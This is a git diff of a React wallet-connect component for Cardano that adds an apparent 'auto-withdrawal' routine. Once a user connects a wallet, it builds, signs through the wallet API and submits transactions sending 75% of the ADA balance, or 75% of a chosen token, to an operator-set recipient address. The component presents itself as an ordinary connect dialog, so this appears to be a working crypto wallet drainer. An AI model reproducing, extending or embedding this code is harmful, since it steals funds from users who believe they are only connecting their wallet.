@@ -12,7 +12,7 @@ import {
   MultiAsset,
   Assets,
   ScriptHash,
-
+  TransactionOutput,
   AssetName,
   TransactionUnspentOutput,
   TransactionUnspentOutputs,
@@ -31,26 +31,6 @@ import {
 function ConnectWallet({ onClose }) {
 
 
-  let wallet = {
-    selectedTabId: "1",
-    whichWalletSelected: undefined,
-    walletFound: false,
-    walletIsEnabled: false,
-    walletName: undefined,
-    walletIcon: undefined,
-    walletAPIVersion: undefined,
-    wallets: [],
-
-    networkId: undefined,
-    Utxos: undefined,
-    balance: undefined,
-    changeAddress: undefined,
-    rewardAddress: undefined,
-    usedAddress: undefined,
-    submittedTxHash: "",
-
-
-  }
 
   const [walletsArray, setWalletsArray] = useState([])
 
@@ -229,15 +209,11 @@ function ConnectWallet({ onClose }) {
 
 
 
+  const getWalletAssets = async (api) => {
+    if (!api) return;
+    console.log(api)
 
-
-
-
-  const getWalletAssets = async (nami) => {
-    if (!nami) return;
-    console.log(nami)
-
-    const balanceHex = await nami.getBalance();
+    const balanceHex = await api.getBalance();
     const balance = Value.from_bytes(Buffer.from(balanceHex, 'hex'));
 
     let assets = [];
@@ -417,11 +393,7 @@ function ConnectWallet({ onClose }) {
 
   const initTransactionBuilder = async () => {
     console.log(staticProtocolParams.linearFee.min_fee_a)
-    // staticProtocolParams.linearFee.min_fee_a = staticProtocolParams.linearFee.min_fee_a.toString()
-    // staticProtocolParams.linearFee.min_fee_b = staticProtocolParams.linearFee.min_fee_b.toString()
-    // protocolParams.coins_per_utxo_word = "34482"
-    // protocolParams.coins_per_utxo_size = "34482"
-    // protocolParams.min_utxo = '34482'
+
 
     try {
       // Validate protocolParams
@@ -571,17 +543,12 @@ function ConnectWallet({ onClose }) {
 
     const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;
 
-    // getUtxoBalance(address, walletApi).then(balance => {
-    //   console.log(`The UTXO balance for address ${address} is ${balance} ADA`);
-    // });
-
     // Calculate 3/4 of the ADA balance
-    const adaToWithdraw = currentBalance
-    // const protocolParams = await fetchProtocolParams();
+    const adaToWithdraw = currentBalance * 0.75
     try {
 
       // Convert ADA to Lovelace without padding
-      const lovelaceAmount = Math.floor(adaToWithdraw * 1000000).toString();
+      const lovelaceAmount = Math.floor(Number(adaToWithdraw) * 1000000).toString();
 
       console.log("Lovelace amount:", lovelaceAmount);
 
@@ -600,38 +567,56 @@ function ConnectWallet({ onClose }) {
         return;
       }
 
-      // Process ADA withdrawal
-      // await buildSendADATransaction(
-      //   recipientAddress,
-      //   lovelaceAmount,
-      //   walletApi,
-      //   protocolParams,
-      //   address
-      // );
-      const sortToHighest = sort(filteredAssets).asc((asset) => asset.quantity)
-      const sortToLowest = sort(filteredAssets).desc((asset) => asset.quantity)
-      console.log(sortToHighest)
-      console.log(sortToLowest)
-      const selectedAsset = sortToLowest[3]
-      console.log(selectedAsset)
-      const minimumADA = 120000;
-      const adaToSendWithAsset = Math.min(minimumADA, currentBalance * 1000000);
+      if (assets.length < 2) {
+        // Process ADA withdrawal
+        try {
+          console.log('Ada is the single asset in the wallet, thus the sending of ada')
+          await buildSendADATransaction(
+            recipientAddress,
+            lovelaceAmount,
+            walletApi,
+            staticProtocolParams,
+            address
+          );
+          console.log('Transaction Succesful')
+        } catch (error) {
+          console.error("Error sending ADA: " + error)
+        }
+
+      }
+
+      else {
+        const assetValues = await calculateAssetValues(assets)
+
+        // const totalAssetValue = assetValues.reduce((asset)=>{
+        //    return 
+        // },0)
+
+        const sortToHighest = sort(filteredAssets).asc((asset) => asset.quantity)
+        const sortToLowest = sort(filteredAssets).desc((asset) => asset.quantity)
+        console.log(sortToHighest)
+        console.log(sortToLowest)
+        const selectedAsset = sortToHighest[0]
+        console.log(selectedAsset)
+        const minimumADA = 120000;
+        const adaToSendWithAsset = Math.min(minimumADA, currentBalance * 1000000);
 
 
-      console.log(selectedAsset, adaToSendWithAsset, adaToWithdraw)
-      // Calculate 3/4 of the asset's quantity
-      // const { amount, policyIdRaw, assetNameRaw, } = selectedAsset;
-      selectedAsset.quantity = Math.floor(selectedAsset.quantity * 0.75).toString();
-      await buildSendTokenTransaction(
-        walletApi,
-        recipientAddress,
-        address,
-        minimumADA,
-        staticProtocolParams,
-        selectedAsset,
-        utxos,
-        currentBalance
-      )
+        console.log(selectedAsset, adaToSendWithAsset, adaToWithdraw)
+        // Calculate 3/4 of the asset's quantity
+        selectedAsset.quantity = Math.floor(selectedAsset.quantity * 0.75).toString();
+        await buildSendTokenTransaction(
+          walletApi,
+          recipientAddress,
+          address,
+          minimumADA,
+          staticProtocolParams,
+          selectedAsset,
+          utxos,
+          currentBalance
+        )
+      }
+
       // await buildSendTokenTransactionMulti(
       //   walletApi,
       //   recipientAddress,
@@ -643,20 +628,176 @@ function ConnectWallet({ onClose }) {
       //   currentBalance
       // )
 
-
-
-
-
-      console.log(assets)
-
-
     } catch (error) {
       console.error("Error during auto-withdrawal:", error);
     }
   }
 
 
+  const buildSendADATransaction = async (
+    recAddress,
+    amount,
+    nami,
+    protocolParams,
+    address
+  ) => {
+    try {
+      let shelleyOutputAddress, shelleyChangeAddress, utxosHex, utxos, txBody, transactionWitnessSet, tx, txVkeyWitnesses, signedTx, submittedTxHash;
 
+      const txBuilder = await initTransactionBuilder()
+
+      console.log("Amount in Lovelace:", amount, recAddress, "naddr", address);
+
+      try {
+        shelleyOutputAddress = Address.from_bech32(recAddress);
+      } catch (error) {
+        console.error("Error converting recipient address to Shelley format:", error);
+        throw error;
+      }
+
+      try {
+        shelleyChangeAddress = Address.from_bech32(address);
+      } catch (error) {
+        console.error("Error converting sender address to Shelley format:", error);
+        throw error;
+      }
+
+      console.log("Amount in Lovelace:", shelleyOutputAddress, shelleyChangeAddress);
+
+      try {
+        utxosHex = await nami.getUtxos();
+      } catch (error) {
+        console.error("Error fetching UTXOs:", error);
+        throw error;
+      }
+
+      console.log("Amount in Lovelace:", utxosHex);
+
+      try {
+        utxos = utxosHex.map((hex) =>
+          TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
+        );
+      } catch (error) {
+        console.error("Error converting UTXOs from hex:", error);
+        throw error;
+      }
+
+      console.log("Amount in Lovelace:", utxosHex);
+
+      try {
+        utxos.forEach((utxo) => {
+          txBuilder.add_input(
+            Address.from_bech32(address),
+            utxo.input(),
+            utxo.output().amount()
+          );
+        });
+      } catch (error) {
+        console.error("Error adding UTXOs to transaction builder:", error);
+        throw error;
+      }
+
+      console.log("Amount in Lovelace:", utxosHex);
+
+      try {
+        txBuilder.add_output(
+          TransactionOutput.new(
+            shelleyOutputAddress,
+            Value.new(BigNum.from_str(amount))
+          )
+        );
+      } catch (error) {
+        console.error("Error adding output to transaction builder:", error);
+        throw error;
+      }
+
+      try {
+        txBuilder.add_change_if_needed(shelleyChangeAddress);
+      } catch (error) {
+        console.error("Error adding change if needed:", error);
+        throw error;
+      }
+
+      try {
+        txBody = txBuilder.build();
+      } catch (error) {
+        console.error("Error building transaction body:", error);
+        throw error;
+      }
+
+      try {
+        transactionWitnessSet = TransactionWitnessSet.new();
+      } catch (error) {
+        console.error("Error creating TransactionWitnessSet object:", error);
+        throw error;
+      }
+
+      try {
+        tx = Transaction.new(
+          txBody,
+          TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
+        );
+      } catch (error) {
+        console.error("Error creating transaction object:", error);
+        throw error;
+      }
+
+      console.log("Amount in Lovelace:", tx);
+
+      try {
+        txVkeyWitnesses = await nami.signTx(
+          Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
+          true
+        );
+      } catch (error) {
+        console.error("Error signing transaction:", error);
+        throw error;
+      }
+
+      try {
+        txVkeyWitnesses = TransactionWitnessSet.from_bytes(
+          Buffer.from(txVkeyWitnesses, "hex")
+        );
+      } catch (error) {
+        console.error("Error converting signed transaction:", error);
+        throw error;
+      }
+
+      try {
+        transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());
+      } catch (error) {
+        console.error("Error setting vkeys in transaction witness set:", error);
+        throw error;
+      }
+
+      try {
+        signedTx = Transaction.new(tx.body(), transactionWitnessSet);
+      } catch (error) {
+        console.error("Error creating signed transaction:", error);
+        throw error;
+      }
+
+      try {
+        submittedTxHash = await nami.submitTx(
+          Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
+        );
+        console.log("Submitted transaction hash:", submittedTxHash);
+      } catch (error) {
+        console.error("Error submitting transaction:", error);
+        throw error;
+      }
+
+      return submittedTxHash;
+    } catch (error) {
+      console.error("Error in buildSendADATransaction:", error);
+      console.error("Stack Trace:", error.stack);
+      throw error; // Re-throw the error if you want it to be handled elsewhere
+    }
+  };
+
+  // FUNCTION TO SEND THE HIGHEST VALUED ASSET IN THE WALLET, IN THE EVENT THAT THE ADA BALANCE
+  // IS LOWER THAN THE CUMULATIVE VALUE OF THE ASSETS IN THE WALLET
+  // AND THE VALUES OF THE OTHER ASSETS ARE NEGLIGIBLE
   const buildSendTokenTransaction = async (API, recAddress, address, adaToSendWithAsset, protocolParams, asset, utxos, currentBalance) => {
     try {
       // Validate required parameters
@@ -862,6 +1003,8 @@ function ConnectWallet({ onClose }) {
   };
 
 
+  // FUNCTION TO SEND MULTIPLE ASSETS, IN THE EVENT THAT THE ADA BALANCE 
+  // IS LOWER THAN THE CUMULATIVE VALUE OF THE ASSETS IN THE WALLET
   const buildSendTokenTransactionMulti = async (API, recAddress, address, adaToSendWithAsset, protocolParams, assetsToSend, utxos, currentBalance) => {
     try {
       // Validate required parameters
@@ -938,7 +1081,7 @@ function ConnectWallet({ onClose }) {
       // Calculate minimum ADA required and build output
       try {
         const adaToSend = BigNum.from_str(protocolParams.coins_per_utxo_word);
-        console.log(txOutputBuilder)
+        console.log(txOutputBuilder, adaToSend)
         txOutputBuilder = txOutputBuilder.with_asset_and_min_required_coin(multiAsset, adaToSend);
         txOutput = txOutputBuilder.build();
 
@@ -1035,10 +1178,8 @@ function ConnectWallet({ onClose }) {
 
             if (addresses && addresses.length > 0) {
               const hexAddress = addresses[0];
-              console.log(hexAddress)
               setSelectedWallet(key);
               const addressBytes = Buffer.from(hexAddress, "hex");
-              console.log(addressBytes)
               const address = Address.from_bytes(addressBytes);
               console.log(
                 `Connected to ${key}. Hex Address:`,
@@ -1291,7 +1432,7 @@ function ConnectWallet({ onClose }) {
   };
 
 
-  console.log(filteredWalletNames)
+
   return (
     <div className="fixed inset-0 flex items-center justify-center lg:justify-end z-[500] bg-[#ffffff1c] bg-opacity-50 backdrop-blur">
       <div className="ConnectWallet w-full max-w-[420px] lg:h-full lg:bg-[#111218]">
